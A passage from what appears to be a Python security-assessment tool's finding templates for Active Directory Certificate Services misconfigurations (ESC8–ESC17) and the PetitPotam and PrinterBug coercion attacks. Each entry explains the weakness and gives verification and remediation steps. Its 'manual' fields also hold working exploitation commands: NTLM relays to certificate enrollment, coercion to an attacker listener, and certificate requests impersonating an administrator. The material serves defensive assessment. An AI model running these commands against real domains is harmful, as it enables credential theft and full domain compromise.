            "# In the CA console (certsrv.msc) these map to the 'Manage CA' and "
            "'Issue and Manage Certificates' rights on the CA Security tab."
        ),
        "verify_linux": (
            "Read-only ADCS enumeration; the CA rights are reported in the CA "
            "permissions section (no change made):\n"
            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
            "-vulnerable -stdout\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/certificate-authorities"
        ),
        "remediation": (
            "Remove Manage CA and Issue and Manage Certificates rights from every "
            "non-Tier-0 principal on {target} — set them from the CA Security tab "
            "in certsrv.msc (or certutil -setreg CA\\Security) so only PKI "
            "administrators retain them.",
            "Separate the certificate-manager (officer) role from ordinary users "
            "and restrict it to a dedicated, monitored group.",
            "Review the CA policy flags (certutil -getreg policy\\EditFlags) for "
            "any change an attacker with ManageCA could have made, in particular "
            "EDITF_ATTRIBUTESUBJECTALTNAME2, and revert it.",
            "Enable CA audit logging (certutil -setreg CA\\AuditFilter 127; "
            "Restart-Service certsvc) so future CA-configuration and "
            "request-approval events are recorded.",
        ),
    },
    "adcsesc8": {
        "short": (
            "ADCS ESC8: the CA exposes an HTTP web-enrollment endpoint, so a "
            "coerced machine's authentication can be relayed to it to obtain a "
            "certificate for that machine — including a domain controller."
        ),
        "long": (
            "ADCS ESC8 abuses the CA's HTTP web-enrollment interface "
            "(certsrv / the certificate enrollment web service), which by default "
            "accepts NTLM authentication with no channel binding. Any principal "
            "who can capture or coerce a victim's NTLM authentication — commonly a "
            "domain controller coerced via a printer-bug / EFSRPC trigger — relays "
            "that authentication to the web-enrollment endpoint and requests a "
            "client authentication certificate as the victim. A certificate for a "
            "domain controller's machine account can then be used to authenticate "
            "and replicate the directory, so ESC8 escalates straight to domain "
            "compromise of {target}. The relay only requires the victim to hold "
            "any valid domain credential, which makes it cross-forest capable."
        ),
        "manual": (
            "# Confirm the CA web-enrollment endpoint is present and relay-able:\n"
            "certipy find -u <user>@<domain> -p <pass> -dc-ip <dc_ip> "
            "-vulnerable -stdout\n"
            "# 1) Stand up a relay to the CA web-enrollment endpoint requesting a "
            "DC template:\n"
            "ntlmrelayx.py -t http://<ca_host>/certsrv/certfnsh.asp -smb2support "
            "--adcs --template DomainController\n"
            "# 2) Coerce the DC to authenticate to the relay, then PKINIT with the "
            "issued cert:\n"
            "coercer coerce -u <user> -p <pass> -t <dc_ip> -l <attacker_ip>\n"
            "certipy auth -pfx dc.pfx -dc-ip <dc_ip>"
        ),
        "verify_windows": (
            "Check whether the CA offers HTTP web enrollment (the ESC8 relay "
            "surface). Confirm the Certificate Enrollment web role is installed "
            "and whether it is bound to HTTP:\n"
            "Get-WindowsFeature ADCS-Web-Enrollment, ADCS-Enroll-Web-Svc\n"
            "Get-WebBinding | Where-Object { $_.protocol -eq 'http' }\n"
            "# Confirm Extended Protection for Authentication (channel binding) is "
            "enforced on any HTTPS enrollment site so a relay is defeated."
        ),
        "verify_linux": (
            "Read-only ADCS enumeration reports the web-enrollment endpoint under "
            "the CA (no relay performed):\n"
            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
            "-vulnerable -stdout\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/unsigned-endpoints"
        ),
        "remediation": (
            "Disable HTTP web enrollment where it is not required (remove the "
            "Certificate Enrollment Web role, or restrict it to HTTPS only) so "
            "there is no unsigned NTLM endpoint to relay to.",
            "Enable Extended Protection for Authentication (channel binding) and "
            "require HTTPS on the enrollment web site so relayed NTLM "
            "authentication is rejected.",
            "Enforce SMB signing and, where possible, disable NTLM in favour of "
            "Kerberos so the coercion-to-relay chain has no authentication to "
            "capture.",
            "Reduce which accounts can be coerced by hardening the coercion "
            "triggers (Print Spooler, EFSRPC, DFS) on domain controllers and "
            "servers.",
        ),
    },
    "adcsesc9": {
        "short": (
            "ADCS ESC9: certificate template {template} carries the "
            "CT_FLAG_NO_SECURITY_EXTENSION flag, so a certificate {source} enrolls "
            "omits the SID binding and can be mapped to a privileged account."
        ),
        "long": (
            "ADCS ESC9 abuses a certificate template whose "
            "msPKI-Enrollment-Flag includes CT_FLAG_NO_SECURITY_EXTENSION, which "
            "tells the CA NOT to embed the szOID_NTDS_CA_SECURITY_EXT SID security "
            "extension in the issued certificate. Without that extension the domain "
            "controller falls back to weak, name-based certificate-to-account "
            "mapping. {source_type} {source}, holding enrollment rights on the "
            "client authentication template {template} with no manager approval, "
            "can (typically after altering a controllable account's UPN, or "
            "combined with a shadow-credential / password-reset primitive) enroll "
            "a certificate that a DC then maps to a privileged victim, "
            "authenticating as them and compromising {target}."
        ),
        "manual": (
            "# Enumerate ADCS and confirm the NO_SECURITY_EXTENSION template:\n"
            "certipy find -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
            "-vulnerable -stdout\n"
            "# With control of a victim UPN, enroll and authenticate as the victim:\n"
            "certipy req -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
            "-ca <ca_name> -template {template}\n"
            "certipy auth -pfx <victim>.pfx -dc-ip <dc_ip>"
        ),
        "verify_windows": (
            "Confirm {template} sets CT_FLAG_NO_SECURITY_EXTENSION (0x80000 in "
            "msPKI-Enrollment-Flag) and grants client authentication:\n"
            "$cfg = (Get-ADRootDSE).configurationNamingContext\n"
            "Get-ADObject -LDAPFilter '(cn={template})' -SearchBase "
            "\"CN=Certificate Templates,CN=Public Key Services,CN=Services,$cfg\" "
            "-Properties msPKI-Enrollment-Flag, pKIExtendedKeyUsage |\n"
            "  Format-List cn, msPKI-Enrollment-Flag, pKIExtendedKeyUsage\n"
            "# Confirm StrongCertificateBindingEnforcement is enforced on DCs "
            "(KB5014754):\n"
            "Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Kdc' "
            "-Name StrongCertificateBindingEnforcement"
        ),
        "verify_linux": (
            "Read-only ADCS enumeration; confirm {template} is flagged ESC9 (no "
            "certificate requested):\n"
            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
            "-vulnerable -stdout\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/certificate-templates"
        ),
        "remediation": (
            "Clear the CT_FLAG_NO_SECURITY_EXTENSION flag on {template} so issued "
            "certificates carry the szOID_NTDS_CA_SECURITY_EXT SID extension and "
            "bind strongly to the enrolling account.",
            "Set StrongCertificateBindingEnforcement to 2 (Full enforcement) on "
            "domain controllers per KB5014754 so a certificate without the SID "
            "extension is rejected for authentication.",
            "Restrict enrollment on {template} and remove it from broad groups so "
            "a low-privileged principal cannot request it.",
            "Protect the write paths that let an attacker change a victim's UPN or "
            "add a key credential (the pairing ESC9 depends on) by auditing "
            "GenericWrite / GenericAll on user objects.",
        ),
    },
    "adcsesc10": {
        "short": (
            "ADCS ESC10: a domain controller uses weak certificate mapping, so a "
            "certificate {source} enrolls from template {template} can be mapped "
            "to a privileged account via its UPN."
        ),
        "long": (
            "ADCS ESC10 abuses weak certificate-to-account mapping configured on "
            "domain controllers — either the UPN mapping registry value "
            "(CertificateMappingMethods including the UPN bit) or "
            "StrongCertificateBindingEnforcement left below Full. When mapping is "
            "weak, a DC authenticates a certificate by matching a name field "
            "instead of the strong SID binding. {source_type} {source}, able to "
            "enroll in the client authentication template {template} and to control "
            "or set a victim's userPrincipalName (or set it to a privileged "
            "account's UPN), obtains a certificate the DC then maps to that "
            "victim — authenticating as them and compromising {target}. ESC10 is "
            "the DC-side mapping analogue of ESC9's template-side flag."
        ),
        "manual": (
            "# Enumerate ADCS and DC mapping configuration:\n"
            "certipy find -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
            "-vulnerable -stdout\n"
            "# After setting the victim UPN, enroll and authenticate as the victim:\n"
            "certipy req -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
            "-ca <ca_name> -template {template}\n"
            "certipy auth -pfx <victim>.pfx -dc-ip <dc_ip>"
        ),
        "verify_windows": (
            "Confirm the DC uses weak certificate mapping — the UPN mapping method "
            "is enabled and strong binding is not enforced:\n"
            "Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Kdc' "
            "-Name StrongCertificateBindingEnforcement\n"
            "Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\"
            "SecurityProviders\\SCHANNEL' -Name CertificateMappingMethods\n"
            "# StrongCertificateBindingEnforcement should be 2 (Full); "
            "CertificateMappingMethods should not enable weak UPN/email mapping."
        ),
        "verify_linux": (
            "Read-only ADCS enumeration reports the DC mapping weakness (nothing "
            "changed):\n"
            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
            "-vulnerable -stdout\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/certificate-templates"
        ),
        "remediation": (
            "Set StrongCertificateBindingEnforcement to 2 (Full enforcement) on "
            "all domain controllers per KB5014754 so certificate authentication "
            "requires the strong SID binding.",
            "Remove weak mapping methods from the SCHANNEL CertificateMappingMethods "
            "registry value so a certificate cannot be mapped by UPN or email "
            "alone.",
            "Restrict who can modify userPrincipalName on user objects (audit "
            "GenericWrite / GenericAll) so an attacker cannot point a victim UPN at "
            "a privileged account.",
            "Restrict enrollment on {template} to authorized identities and require "
            "manager approval where feasible.",
        ),
    },
    "adcsesc11": {
        "short": (
            "ADCS ESC11: the CA's ICertPassage RPC interface does not enforce "
            "packet encryption, so a coerced machine's authentication can be "
            "relayed to it to obtain a certificate as that machine."
        ),
        "long": (
            "ADCS ESC11 is the RPC-interface counterpart of ESC8. The CA exposes "
            "the ICertPassage Remote Protocol (MS-ICPR) over RPC, and when the CA "
            "does not require IF_ENFORCEENCRYPTICERTREQUEST (packet privacy), a "
            "requester's authentication can be relayed to the RPC endpoint to enrol "
            "a certificate on the victim's behalf. As with ESC8, coercing a "
            "domain controller's authentication and relaying it to the CA yields a "
            "certificate for the DC machine account, which then authenticates and "
            "replicates the directory — full domain compromise of {target}. The "
            "relay only needs any valid domain credential, so it is cross-forest "
            "capable."
        ),
        "manual": (
            "# Confirm the CA RPC endpoint accepts unencrypted requests (ESC11):\n"
            "certipy find -u <user>@<domain> -p <pass> -dc-ip <dc_ip> "
            "-vulnerable -stdout\n"
            "# Relay coerced authentication to the CA RPC (ICPR) endpoint:\n"
            "ntlmrelayx.py -t rpc://<ca_host> -rpc-mode ICPR -icpr-ca-name "
            "<ca_name> -smb2support\n"
            "coercer coerce -u <user> -p <pass> -t <dc_ip> -l <attacker_ip>\n"
            "certipy auth -pfx dc.pfx -dc-ip <dc_ip>"
        ),
        "verify_windows": (
            "Confirm the CA enforces RPC encryption for enrollment requests — the "
            "IF_ENFORCEENCRYPTICERTREQUEST interface flag should be set:\n"
            "certutil -config '<ca_host>\\<ca_name>' -getreg CA\\InterfaceFlags |\n"
            "  Select-String -Pattern 'ENFORCEENCRYPTICERTREQUEST'\n"
            "# If the flag is absent, the ICPR endpoint accepts relayed, "
            "unencrypted requests."
        ),
        "verify_linux": (
            "Read-only ADCS enumeration reports the ICPR encryption state under "
            "the CA (no relay performed):\n"
            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
            "-vulnerable -stdout\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/unsigned-endpoints"
        ),
        "remediation": (
            "Enable RPC request encryption on the CA: set the "
            "IF_ENFORCEENCRYPTICERTREQUEST interface flag (certutil -setreg "
            "CA\\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST) and restart the "
            "certificate service so relayed unencrypted requests are rejected.",
            "Enforce SMB signing and prefer Kerberos over NTLM so the coercion-to-"
            "relay chain has no authentication to capture.",
            "Harden the coercion triggers (Print Spooler, EFSRPC, DFS) on domain "
            "controllers so a machine account cannot be forced to authenticate to "
            "an attacker.",
            "Monitor the CA for certificate requests originating from unexpected "
            "hosts, particularly certificates issued to machine accounts.",
        ),
    },
    "adcsesc13": {
        "short": (
            "ADCS ESC13: certificate template {template} has an issuance-policy OID "
            "linked to a group, so a certificate {source} enrolls yields a logon "
            "ticket whose PAC carries that group's privileges."
        ),
        "long": (
            "ADCS ESC13 abuses an issuance policy that is linked to an Active "
            "Directory group through the msDS-OIDToGroupLink attribute. When a "
            "certificate template carries such an issuance-policy OID, a "
            "certificate issued from it makes the authenticating account a member "
            "of the linked group for the duration of that logon — the group SID is "
            "injected into the Kerberos PAC even though the account is not a real "
            "member. {source_type} {source}, holding enrollment rights on "
            "{template} with no manager approval, enrolls and authenticates via "
            "PKINIT to obtain a TGT whose PAC carries the linked group's SID. If "
            "that group is privileged, the attacker gains its rights and can reach "
            "{target}. The elevation lives only in that ticket, so it must be used "
            "directly rather than re-authenticating with the account's password."
        ),
        "manual": (
            "# Enumerate ADCS and confirm the OID-to-group link on the template:\n"
            "certipy find -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
            "-vulnerable -stdout\n"
            "# Enroll from the ESC13 template, then PKINIT to get a TGT carrying "
            "the linked group SID:\n"
            "certipy req -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
            "-ca <ca_name> -template {template}\n"
            "certipy auth -pfx {source}.pfx -dc-ip <dc_ip>"
        ),
        "verify_windows": (
            "Find issuance-policy OIDs that are linked to a group, then confirm "
            "{template} references one:\n"
            "$cfg = (Get-ADRootDSE).configurationNamingContext\n"
            "Get-ADObject -SearchBase \"CN=OID,CN=Public Key Services,CN=Services,"
            "$cfg\" -LDAPFilter '(msDS-OIDToGroupLink=*)' -Properties "
            "msPKI-Cert-Template-OID, msDS-OIDToGroupLink |\n"
            "  Format-List cn, msPKI-Cert-Template-OID, msDS-OIDToGroupLink\n"
            "# Then confirm {template}'s msPKI-Certificate-Policy references that OID."
        ),
        "verify_linux": (
            "Read-only ADCS enumeration; confirm the OID-to-group linkage on "
            "{template} (no certificate requested):\n"
            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
            "-vulnerable -stdout\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/certificate-templates"
        ),
        "remediation": (
            "Remove the msDS-OIDToGroupLink value from the issuance-policy OID "
            "object unless the group-membership-via-certificate behaviour is "
            "deliberately required, and never link an issuance policy to a "
            "privileged group.",
            "Restrict enrollment on {template} to authorized identities and require "
            "manager approval so a low-privileged principal cannot mint the "
            "group-bearing certificate.",
            "Audit every issuance policy for a group link (Get-ADObject over the "
            "OID container) and treat any link to a Tier-0 group as a critical "
            "finding.",
            "Enable ADCS issuance auditing (Event IDs 4886 / 4887) so enrollment "
            "in the affected template is logged.",
        ),
    },
    "adcsesc14": {
        "short": (
            "ADCS ESC14: certificate template {template} relies on weak SAN-based "
            "mapping (altSecurityIdentities), so a certificate {source} enrolls can "
            "be mapped to a privileged account."
        ),
        "long": (
            "ADCS ESC14 abuses weak explicit certificate mapping via the "
            "altSecurityIdentities attribute together with a template that requires "
            "a SAN-based (UPN or email) subject. When a victim account has a weak "
            "altSecurityIdentities mapping — or when an attacker who can write that "
            "attribute adds one pointing at a certificate it can obtain — a "
            "certificate is mapped to that account without the strong SID binding. "
            "{source_type} {source}, able to enroll in {template} (which requires "
            "SAN-based mapping, has no manager approval, and is enrollable by a "
            "non-Tier-0 principal), obtains a certificate that a domain controller "
            "then maps to a privileged victim, authenticating as them and reaching "
            "{target}."
        ),
        "manual": (
            "# Enumerate ADCS and confirm the SAN-mapping template + weak "
            "altSecurityIdentities:\n"
            "certipy find -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
            "-vulnerable -stdout\n"
            "# Where the victim has (or can be given) a weak altSecurityIdentities "
            "mapping, enroll and authenticate as the victim:\n"
            "certipy req -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
            "-ca <ca_name> -template {template}\n"
            "certipy auth -pfx <victim>.pfx -dc-ip <dc_ip>"
        ),
        "verify_windows": (
            "List accounts carrying a weak altSecurityIdentities mapping and "
            "confirm {template} requires SAN-based subject mapping:\n"
            "Get-ADObject -LDAPFilter '(altSecurityIdentities=*)' -Properties "
            "altSecurityIdentities |\n"
            "  Format-List Name, altSecurityIdentities\n"
            "# Weak forms (subject-only, issuer-subject, email) are exploitable; "
            "only X509:<SKI> or the SID extension are strong."
        ),
        "verify_linux": (
            "Read-only ADCS enumeration; confirm {template} is flagged ESC14 (no "
            "certificate requested):\n"
            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
            "-vulnerable -stdout\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/certificate-templates"
        ),
        "remediation": (
            "Replace weak altSecurityIdentities mappings with a strong form "
            "(X509:<SKI> or the issuer+serial pairing) and remove subject-only, "
            "issuer-subject, or email-based mappings from every account.",
            "Enforce StrongCertificateBindingEnforcement = 2 on domain controllers "
            "per KB5014754 so weak explicit mappings are rejected.",
            "Restrict write access to the altSecurityIdentities attribute (audit "
            "GenericWrite / WriteProperty on user objects) so an attacker cannot "
            "add a self-serving mapping.",
            "Restrict enrollment on {template} and require manager approval where "
            "feasible.",
        ),
    },
    "adcsesc15": {
        "short": (
            "ADCS ESC15 (EKUwu): schema V1 template {template} lets {source} supply "
            "the subject AND inject application policies, so it can request a "
            "certificate usable for client authentication and impersonate any user."
        ),
        "long": (
            "ADCS ESC15 (also called EKUwu, CVE-2024-49019) abuses a schema "
            "version 1 certificate template that allows the enrollee to supply the "
            "subject (ENROLLEE_SUPPLIES_SUBJECT). On a V1 template the requester "
            "can additionally inject arbitrary application policies into the "
            "request. {source_type} {source}, holding enrollment rights on "
            "{template} with no manager approval, requests a certificate supplying "
            "both a privileged subject and a Client Authentication application "
            "policy — even if the template's own EKU would not normally allow "
            "authentication. The resulting certificate authenticates as the "
            "privileged victim via PKINIT (or as a server for a Schannel path), "
            "compromising {target}."
        ),
        "manual": (
            "# Enumerate ADCS and confirm the V1 enrollee-supplies-subject template:\n"
            "certipy find -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
            "-vulnerable -stdout\n"
            "# Request a cert injecting a client-auth application policy and a "
            "privileged subject, then authenticate:\n"
            "certipy req -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
            "-ca <ca_name> -template {template} -upn administrator@<domain> "
            "-application-policies 'Client Authentication'\n"
            "certipy auth -pfx administrator.pfx -dc-ip <dc_ip>"
        ),
        "verify_windows": (
            "Confirm {template} is schema version 1 and allows the enrollee to "
            "supply the subject:\n"
            "$cfg = (Get-ADRootDSE).configurationNamingContext\n"
            "Get-ADObject -LDAPFilter '(cn={template})' -SearchBase "
            "\"CN=Certificate Templates,CN=Public Key Services,CN=Services,$cfg\" "
            "-Properties msPKI-Template-Schema-Version, msPKI-Certificate-Name-Flag |\n"
            "  Format-List cn, msPKI-Template-Schema-Version, "
            "msPKI-Certificate-Name-Flag\n"
            "# Schema-Version 1 plus the ENROLLEE_SUPPLIES_SUBJECT bit (0x1) is the "
            "EKUwu condition."
        ),
        "verify_linux": (
            "Read-only ADCS enumeration; confirm {template} is flagged ESC15 (no "
            "certificate requested):\n"
            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
            "-vulnerable -stdout\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/certificate-templates"
        ),
        "remediation": (
            "Apply Microsoft's CVE-2024-49019 update on the CA so the CA ignores "
            "attacker-supplied application policies in requests.",
            "Migrate {template} away from schema version 1 to a version 2 or 3 "
            "template, or disable the enrollee-supplies-subject flag so the subject "
            "cannot be attacker-controlled.",
            "Restrict enrollment on {template} to authorized identities and require "
            "manager approval where feasible.",
            "Enforce strong certificate mapping on domain controllers per "
            "KB5014754 so a mis-issued certificate cannot be mapped to a privileged "
            "account.",
        ),
    },
    "adcsesc16": {
        "short": (
            "ADCS ESC16: the CA omits the SID security extension from every "
            "certificate it issues, so a certificate {source} obtains can be mapped "
            "to a privileged account through weak name-based mapping."
        ),
        "long": (
            "ADCS ESC16 is a CA-wide weakness: the certification authority is "
            "configured to leave the szOID_NTDS_CA_SECURITY_EXT SID security "
            "extension out of every certificate it issues (the extension OID "
            "1.3.6.1.4.1.311.25.2 is present in the CA's DisableExtensionList). "
            "Without that extension a domain controller cannot bind a certificate "
            "to an account by SID and falls back to weaker name-based mapping — for "
            "the whole CA, not a single template. {source_type} {source} can then "
            "obtain a certificate (from any enrollable authentication template) "
            "and, combined with a controllable name attribute or weak DC mapping, "
            "have it mapped to a privileged victim, authenticating as them and "
            "compromising {target}. ESC16 is ESC9 raised from template scope to "
            "CA scope."
        ),
        "manual": (
            "# Enumerate ADCS; ESC16 is reported as a CA-wide missing SID "
            "extension:\n"
            "certipy find -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
            "-vulnerable -stdout\n"
            "# With a controllable/weak-mapped victim, enroll and authenticate as "
            "them:\n"
            "certipy req -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
            "-ca <ca_name> -template {template}\n"
            "certipy auth -pfx <victim>.pfx -dc-ip <dc_ip>"
        ),
        "verify_windows": (
            "Confirm the CA suppresses the SID security extension — the OID "
            "1.3.6.1.4.1.311.25.2 present in DisableExtensionList disables it (run "
            "against the CA):\n"
            "certutil -config '<ca_host>\\<ca_name>' -getreg "
            "CA\\DisableExtensionList |\n"
            "  Select-String -Pattern '1.3.6.1.4.1.311.25.2'\n"
            "# A match means every issued certificate lacks the strong SID binding."
        ),
        "verify_linux": (
            "Read-only ADCS enumeration reports the CA-wide missing SID extension "
            "(no certificate requested):\n"
            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
            "-vulnerable -stdout\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/certificate-authorities"
        ),
        "remediation": (
            "Re-enable the SID security extension on the CA by removing the OID "
            "1.3.6.1.4.1.311.25.2 from the disable list (certutil -setreg "
            "CA\\DisableExtensionList -1.3.6.1.4.1.311.25.2) and restart the "
            "certificate service so new certificates carry strong SID binding.",
            "Set StrongCertificateBindingEnforcement to 2 (Full enforcement) on "
            "domain controllers per KB5014754 while certificates are reissued.",
            "Reissue certificates that were issued while the extension was "
            "suppressed, since they cannot be mapped strongly.",
            "Confirm the fix with certutil -getreg CA\\DisableExtensionList and by "
            "dumping a newly issued certificate to verify the SID extension is "
            "present.",
        ),
    },
    "adcsesc17": {
        "short": (
            "ADCS ESC17: {source} can obtain a Server Authentication certificate "
            "from template {template} and use it to impersonate a trusted service, "
            "stand up a rogue TLS endpoint, or support a relay chain."
        ),
        "long": (
            "ADCS ESC17 covers certificate templates that let an attacker mint a "
            "Server Authentication-capable certificate in a way that enables "
            "downstream impersonation, relay, or TLS abuse. In practice the "
            "template combines dangerous enrollment rights with subject control, so "
            "{source_type} {source} can request a certificate that clients trust "
            "for server identity. That certificate can then be used to impersonate "
            "infrastructure clients authenticate to, to stand up a rogue TLS or "
            "LDAPS endpoint for an adversary-in-the-middle position, or to support "
            "relay chains — capturing or replaying authentication material and "
            "pivoting toward {target}. Unlike the client-auth ESCs this is a "
            "server-identity abuse, so its impact is machine impersonation and "
            "credential interception rather than direct PKINIT logon."
        ),
        "manual": (
            "# Enumerate ADCS and confirm the server-auth template is enrollable:\n"
            "certipy find -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
            "-vulnerable -stdout\n"
            "# Request a server-auth cert for a target service identity:\n"
            "certipy req -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
            "-ca <ca_name> -template {template}\n"
            "# The issued cert is then used to impersonate the service / stand up a "
            "rogue TLS endpoint (out-of-band)."
        ),
        "verify_windows": (
            "Confirm {template} grants Server Authentication and is enrollable by a "
            "non-Tier-0 principal with subject control:\n"
            "certutil -v -template {template} |\n"
            "  Select-String -Pattern 'Server Authentication', "
            "'1.3.6.1.5.5.7.3.1', 'ENROLLEE_SUPPLIES_SUBJECT', "
            "'msPKI-Enrollment-Flag'\n"
            "# Then review the template enrollment ACL for over-broad rights."
        ),
        "verify_linux": (
            "Read-only ADCS enumeration; confirm {template} exposes a server-auth "
            "enrollment surface (no certificate requested):\n"
            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
            "-vulnerable -stdout\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/certificate-templates"
        ),
        "remediation": (
            "Restrict enrollment on Server Authentication templates such as "
            "{template} to the specific service accounts and administrators that "
            "must request them; remove enrollment rights from broad groups.",
            "Disable the enrollee-supplies-subject flag on server-auth templates "
            "where it is not strictly required so the subject cannot be "
            "attacker-controlled.",
            "Require CA manager approval on server-auth templates so a certificate "
            "is never issued automatically to an ordinary principal.",
            "Enforce LDAP channel binding and SMB signing, and prefer Kerberos "
            "over NTLM, so a rogue server-auth certificate cannot be leveraged into "
            "a relay or interception position.",
        ),
    },
    "petitpotam": {
        "short": (
            "PetitPotam: {source} can force {target} to authenticate to an "
            "attacker-chosen host over MS-EFSRPC, capturing or relaying the "
            "victim machine's credentials."
        ),
        "long": (
            "PetitPotam abuses the Encrypting File System Remote Protocol "
            "(MS-EFSRPC). Its EfsRpcOpenFileRaw and related methods take a file "
            "path, and when that path points at an attacker-controlled UNC "
            "(\\\\attacker\\share\\file), the targeted machine {target} connects "
            "back and authenticates as its own machine account. {source_type} "
            "{source} calls the coercion method against {target} (originally over "
            "the \\PIPE\\lsarpc named pipe, reachable even unauthenticated on early "
            "unpatched hosts) and captures the incoming authentication. That "
            "machine-account authentication is then relayed — classically to an "
            "ADCS web-enrollment endpoint (ESC8) to obtain a certificate for the "
            "victim, most damagingly a domain controller — turning a coercion "
            "primitive into domain compromise."
        ),
        "manual": (
            "# Coerce the target over MS-EFSRPC to authenticate to your listener:\n"
            "coercer coerce -u <user> -p <pass> -t {target} -l <attacker_ip> "
            "--filter-method-name EfsRpc\n"
            "#   (or the standalone PoC)  petitpotam.py -u <user> -p <pass> "
            "<attacker_ip> {target}\n"
            "# Pair with a relay to ADCS web enrollment (ESC8) to obtain a cert as "
            "the victim machine:\n"
            "ntlmrelayx.py -t http://<ca_host>/certsrv/certfnsh.asp -smb2support "
            "--adcs --template DomainController"
        ),
        "verify_windows": (
            "Confirm the EFS RPC service is reachable and whether the coercion "
            "patch (KB5005413 guidance) and NTLM relay mitigations are in place. "
            "Check the EFS service state and that the RPC filter is deployed:\n"
            "Get-Service EFS\n"
            "netsh rpc filter show filter\n"
            "# Confirm SMB signing / LDAP channel binding so relayed "
            "authentication is rejected:\n"
            "Get-SmbServerConfiguration | Select-Object RequireSecuritySignature"
        ),
        "verify_linux": (
            "Enumerate the coercion methods the target still exposes (a dry-run "
            "that does not complete a relay):\n"
            "coercer scan -u <user> -p <pass> -t {target} -l <attacker_ip>\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-efsr"
        ),
        "remediation": (
            "Apply the current Windows updates that address EFSRPC coercion and "
            "follow Microsoft's guidance in KB5005413 to protect against NTLM "
            "relay attacks.",
            "Enable SMB signing everywhere and enforce LDAP signing plus channel "
            "binding on domain controllers so coerced authentication cannot be "
            "relayed.",
            "Deploy RPC filters to block the MS-EFSRPC interface from untrusted "
            "networks (netsh rpc filter) where EFS remote management is not needed.",
            "Where practical, disable NTLM in favour of Kerberos so a coerced "
            "authentication yields nothing relayable, and remove ADCS HTTP web "
            "enrollment (the common relay target).",
        ),
    },
    "printerbug": {
        "short": (
            "PrinterBug: {source} can force {target} to authenticate to an "
            "attacker-chosen host through the Print System Remote Protocol "
            "(MS-RPRN), capturing or relaying the victim machine's credentials."
        ),
        "long": (
            "The PrinterBug abuses the Print System Remote Protocol (MS-RPRN). Its "
            "RpcRemoteFindFirstPrinterChangeNotificationEx method lets a client ask "
            "a print server to notify it of print changes at a UNC path; when that "
            "path is attacker-controlled (\\\\attacker\\...), the print server "
            "{target} connects back and authenticates as its machine account. Any "
            "host running the Print Spooler service is exploitable, and spooler is "
            "enabled by default on many servers including domain controllers. "
            "{source_type} {source} triggers the callback against {target} over the "
            "\\PIPE\\spoolss named pipe and captures the machine-account "
            "authentication, which is then relayed (for example to ADCS ESC8, or to "
            "LDAP to configure resource-based constrained delegation) to escalate "
            "toward {target}."
        ),
        "manual": (
            "# Coerce the target's Print Spooler to authenticate to your listener:\n"
            "coercer coerce -u <user> -p <pass> -t {target} -l <attacker_ip> "
            "--filter-method-name RpcRemoteFindFirstPrinterChangeNotification\n"
            "#   (or the standalone PoC)  printerbug.py "
            "'<domain>/<user>:<pass>@{target}' <attacker_ip>\n"
            "# Pair with a relay (e.g. to ADCS web enrollment, ESC8):\n"
            "ntlmrelayx.py -t http://<ca_host>/certsrv/certfnsh.asp -smb2support "
            "--adcs --template DomainController"
        ),
        "verify_windows": (
            "Confirm whether the Print Spooler service is running on the target "
            "(the coercion prerequisite):\n"
            "Get-Service Spooler\n"
            "Get-CimInstance Win32_Service -Filter \"Name='Spooler'\" |\n"
            "  Select-Object Name, State, StartMode\n"
            "# On domain controllers and servers that do not print, the spooler "
            "should be disabled."
        ),
        "verify_linux": (
            "Enumerate whether the target still exposes the spooler coercion "
            "method (dry run, no relay):\n"
            "coercer scan -u <user> -p <pass> -t {target} -l <attacker_ip>\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-rprn"
        ),
        "remediation": (
            "Disable the Print Spooler service on every server that does not need "
            "to print, especially domain controllers: Set-Service -Name Spooler "
            "-StartupType Disabled; Stop-Service Spooler.",
            "Where the spooler must run, deploy the 'Allow Print Spooler to accept "
            "client connections' GPO set to Disabled to block remote print "
            "notifications.",
            "Enable SMB signing and enforce LDAP signing plus channel binding so a "
            "coerced machine authentication cannot be relayed.",
            "Prefer Kerberos over NTLM and remove ADCS HTTP web enrollment so the "
            "common relay targets are unavailable.",
        ),
    },
    "dfscoerce": {
        "short": (
            "DFSCoerce: {source} can force {target} to authenticate to an "
            "attacker-chosen host through the DFS Namespace Management protocol "
